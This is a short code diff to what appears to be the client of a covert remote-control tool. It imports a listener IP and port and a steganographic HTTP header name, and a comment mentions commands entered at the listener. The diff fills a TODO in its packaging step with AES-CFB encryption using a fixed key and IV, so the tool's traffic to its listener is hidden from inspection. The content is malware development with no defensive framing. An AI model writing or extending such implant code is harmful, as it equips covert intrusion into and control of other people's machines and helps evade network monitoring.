@@ -13,7 +13,8 @@ import subprocess
 import zlib
 import random
 import string
-from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, CLIENT_MAX_MESSAGE_LENGTH, RequestFlags
+from Crypto.Cipher import AES
+from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, CLIENT_MAX_MESSAGE_LENGTH, AES_KEY, AES_IV, RequestFlags
 
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
@@ -62,12 +63,8 @@ def create_requests(data: str):
     '''
 
     def encrypt_data(data: str):
-        '''
-        Package data for a single request
-        '''
-        # 1. Encryption
-        # TODO
-        return data.encode()
+        cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV)
+        return cipher.encrypt(data.encode())
 
     def compress_data(data: bytes):
         return zlib.compress(data, ZLIB_COMPRESSION_LEVEL)
